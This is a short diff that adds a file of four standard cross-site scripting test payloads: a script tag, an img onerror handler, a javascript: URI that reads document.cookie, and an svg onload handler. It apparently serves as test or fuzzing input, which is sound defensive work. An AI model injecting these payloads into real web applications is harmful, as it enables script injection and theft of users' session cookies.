@@ -1,0 +1,4 @@
+<script>alert('xss')</script>
+<img src="x" onerror="alert(1)">
+javascript:alert(document.cookie)
+<svg/onload=alert(1)>
